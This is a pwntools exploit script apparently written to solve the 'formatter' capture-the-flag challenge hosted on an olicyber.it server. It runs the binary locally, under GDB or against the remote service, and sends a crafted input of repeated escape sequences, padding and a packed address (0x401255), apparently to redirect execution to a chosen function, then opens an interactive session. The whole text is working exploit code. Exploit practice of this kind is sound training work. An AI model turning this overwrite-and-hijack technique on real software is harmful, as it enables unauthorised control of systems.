from pwn import *

elf = context.binary = ELF('./formatter')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("formatter.challs.olicyber.it", 20006)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    c
    ''')
else:
    conn = elf.process()    
conn.sendline(b'\ja'*12 + b'a'*20 + p64(0x401255))
conn.interactive()